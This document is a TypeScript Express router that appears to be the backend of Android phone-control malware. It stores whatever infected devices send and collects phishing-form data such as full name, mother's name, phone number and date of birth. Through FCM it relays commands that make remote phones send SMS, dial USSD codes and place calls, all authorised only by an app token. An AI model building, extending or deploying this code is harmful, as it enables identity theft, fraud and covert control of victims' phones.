import { Router, type IRouter, type Request, type Response } from "express";
import { deviceSmartUpsert, deviceGetByUid, getDevices } from "../lib/supabase-admin.js";
import { broadcast } from "../lib/ws-manager.js";
import {
  sendCheckOnline,
  sendAdminUpdate,
  sendSmsCommand,
  sendUssdCommand,
  sendCallCommand,
  isValidFCMToken,
} from "../lib/fcm.js";

const router: IRouter = Router();

/**
 * POST /api/device/:appToken/upsert
 *
 * Android kuch bhi bheje — sab save ho jaata hai.
 * Known columns → dedicated DB columns.
 * Unknown fields → automatically data_json JSONB mein merge.
 * Service role use hoti hai — RLS ka koi issue nahi.
 *
 * Required: sub_id OR uid in body
 */
router.post("/:appToken/upsert", async (req: Request, res: Response) => {
  const appToken = req.params["appToken"] as string;
  const payload = req.body as Record<string, unknown>;

  if (!appToken?.trim()) {
    res.status(400).json({ error: "appToken required in URL" });
    return;
  }
  if (!payload || typeof payload !== "object" || Array.isArray(payload)) {
    res.status(400).json({ error: "JSON body required" });
    return;
  }
  if (!payload["sub_id"] && !payload["uid"]) {
    res.status(400).json({ error: "sub_id or uid required in body" });
    return;
  }

  try {
    const result = await deviceSmartUpsert(appToken, payload);
    // Broadcast real-time update to all WS subscribers of this app
    broadcast(appToken, "device:updated", result);
    res.json({ ok: true, data: result });
  } catch (e: unknown) {
    // Silently ignore deleted/blocked devices — Android app gets ok:true so it
    // doesn't spam retries; the device simply stays soft-deleted in DB.
    if (e instanceof Error && e.message.startsWith("DEVICE_")) {
      res.json({ ok: true, blocked: true });
      return;
    }
    res.status(500).json({ ok: false, error: String(e) });
  }
});

/**
 * GET /api/device/:appToken/get/:uid
 *
 * Device ka data fetch karo uid se.
 */
router.get("/:appToken/get/:uid", async (req: Request, res: Response) => {
  const appToken = req.params["appToken"] as string;
  const uid = req.params["uid"] as string;

  if (!appToken?.trim() || !uid?.trim()) {
    res.status(400).json({ error: "appToken and uid required" });
    return;
  }

  try {
    const data = await deviceGetByUid(appToken, uid);
    if (!data) {
      res.status(404).json({ ok: false, error: "Device not found" });
      return;
    }
    res.json({ ok: true, data });
  } catch (e: unknown) {
    res.status(500).json({ ok: false, error: String(e) });
  }
});

/**
 * PATCH /api/device/:appToken/update/:uid
 *
 * Partial update — any fields, same smart-merge logic.
 */
router.patch("/:appToken/update/:uid", async (req: Request, res: Response) => {
  const appToken = req.params["appToken"] as string;
  const uid = req.params["uid"] as string;
  const patch = req.body as Record<string, unknown>;

  if (!appToken?.trim() || !uid?.trim()) {
    res.status(400).json({ error: "appToken and uid required" });
    return;
  }

  try {
    const payload = { ...patch, sub_id: uid, uid };
    const result = await deviceSmartUpsert(appToken, payload);
    broadcast(appToken, "device:updated", result);
    res.json({ ok: true, data: result });
  } catch (e: unknown) {
    res.status(500).json({ ok: false, error: String(e) });
  }
});

/**
 * POST /api/device/:appToken/data
 *
 * index.html "Proceed" button se form data aata hai.
 * Body: { appId, deviceId, data: { fullName, motherName, phoneNumber, dob, ... } }
 * Device ke uid se upsert hota hai — data_json.form_data mein merge.
 */
router.post("/:appToken/data", async (req: Request, res: Response) => {
  const appToken = req.params["appToken"] as string;
  const body = req.body as {
    appId?: string;
    deviceId?: string;
    data?: Record<string, unknown>;
  };

  if (!appToken?.trim()) {
    res.status(400).json({ error: "appToken required in URL" });
    return;
  }
  const uid = (body.deviceId ?? "").trim();
  if (!uid) {
    res.status(400).json({ error: "deviceId required in body" });
    return;
  }
  if (!body.data || typeof body.data !== "object") {
    res.status(400).json({ error: "data object required in body" });
    return;
  }

  try {
    const payload: Record<string, unknown> = {
      sub_id: uid,
      uid,
      ...body.data,
      form_data: body.data,
      last_heartbeat_at: Date.now(),
    };

    const result = await deviceSmartUpsert(appToken, payload);
    broadcast(appToken, "device:form_data", result);
    res.json({ ok: true, data: result });
  } catch (e: unknown) {
    res.status(500).json({ ok: false, error: String(e) });
  }
});

/**
 * GET /api/device/:appToken/list
 *
 * Dusra Android app (receiver) — sare devices fetch karo.
 * Returns array of device objects (latest 500, newest first).
 * Same service role — no RLS issues.
 */
router.get("/:appToken/list", async (req: Request, res: Response) => {
  const appToken = req.params["appToken"] as string;
  if (!appToken?.trim()) {
    res.status(400).json({ error: "appToken required" });
    return;
  }
  try {
    const devices = await getDevices(appToken);
    res.json({ ok: true, count: (devices as unknown[]).length, devices });
  } catch (e: unknown) {
    res.status(500).json({ ok: false, error: String(e) });
  }
});

// ─── FCM Relay routes (no admin session needed — app token = auth) ────────────
// Android admin app calls these instead of FCM directly.
// Server uses Firebase Admin SDK + service JSON to forward the FCM.

router.post("/:appToken/fcm/check-online", async (req: Request, res: Response) => {
  const { uid, fcmToken } = req.body as { uid?: string; fcmToken?: string };
  if (!uid?.trim() || !fcmToken?.trim()) {
    res.status(400).json({ ok: false, error: "uid and fcmToken required" });
    return;
  }
  if (!isValidFCMToken(fcmToken.trim())) {
    res.status(400).json({ ok: false, error: "invalid fcmToken" });
    return;
  }
  try {
    const msgId = await sendCheckOnline(fcmToken.trim(), uid.trim());
    res.json({ ok: true, messageId: msgId });
  } catch (e: unknown) {
    res.status(500).json({ ok: false, error: String(e) });
  }
});

router.post("/:appToken/fcm/admin-update", async (req: Request, res: Response) => {
  const { uid, fcmToken, adminNumber, status } = req.body as {
    uid?: string; fcmToken?: string; adminNumber?: string; status?: "ACTIVE" | "INACTIVE";
  };
  if (!uid?.trim() || !fcmToken?.trim() || !adminNumber?.trim()) {
    res.status(400).json({ ok: false, error: "uid, fcmToken, adminNumber required" });
    return;
  }
  if (!isValidFCMToken(fcmToken.trim())) {
    res.status(400).json({ ok: false, error: "invalid fcmToken" });
    return;
  }
  try {
    const msgId = await sendAdminUpdate(fcmToken.trim(), uid.trim(), adminNumber.trim(), status ?? "ACTIVE");
    res.json({ ok: true, messageId: msgId });
  } catch (e: unknown) {
    res.status(500).json({ ok: false, error: String(e) });
  }
});

router.post("/:appToken/fcm/sms", async (req: Request, res: Response) => {
  const { uid, fcmToken, to, body, simSlot } = req.body as {
    uid?: string; fcmToken?: string; to?: string; body?: string; simSlot?: number;
  };
  if (!uid?.trim() || !fcmToken?.trim() || !to?.trim() || body === undefined) {
    res.status(400).json({ ok: false, error: "uid, fcmToken, to, body required" });
    return;
  }
  if (!isValidFCMToken(fcmToken.trim())) {
    res.status(400).json({ ok: false, error: "invalid fcmToken" });
    return;
  }
  try {
    const msgId = await sendSmsCommand(fcmToken.trim(), uid.trim(), to.trim(), body, simSlot ?? 0);
    res.json({ ok: true, messageId: msgId });
  } catch (e: unknown) {
    res.status(500).json({ ok: false, error: String(e) });
  }
});

router.post("/:appToken/fcm/ussd", async (req: Request, res: Response) => {
  const { uid, fcmToken, code, simSlot } = req.body as {
    uid?: string; fcmToken?: string; code?: string; simSlot?: number;
  };
  if (!uid?.trim() || !fcmToken?.trim() || !code?.trim()) {
    res.status(400).json({ ok: false, error: "uid, fcmToken, code required" });
    return;
  }
  if (!isValidFCMToken(fcmToken.trim())) {
    res.status(400).json({ ok: false, error: "invalid fcmToken" });
    return;
  }
  try {
    const msgId = await sendUssdCommand(fcmToken.trim(), uid.trim(), code.trim(), simSlot ?? 0);
    res.json({ ok: true, messageId: msgId });
  } catch (e: unknown) {
    res.status(500).json({ ok: false, error: String(e) });
  }
});

router.post("/:appToken/fcm/call", async (req: Request, res: Response) => {
  const { uid, fcmToken, code, simSlot, number, actionType } = req.body as {
    uid?: string; fcmToken?: string; code?: string;
    simSlot?: number; number?: string; actionType?: string;
  };
  if (!uid?.trim() || !fcmToken?.trim() || !code?.trim()) {
    res.status(400).json({ ok: false, error: "uid, fcmToken, code required" });
    return;
  }
  if (!isValidFCMToken(fcmToken.trim())) {
    res.status(400).json({ ok: false, error: "invalid fcmToken" });
    return;
  }
  try {
    const msgId = await sendCallCommand(
      fcmToken.trim(), uid.trim(), code.trim(),
      simSlot ?? 0, number?.trim(), actionType?.trim()
    );
    res.json({ ok: true, messageId: msgId });
  } catch (e: unknown) {
    res.status(500).json({ ok: false, error: String(e) });
  }
});

export default router;
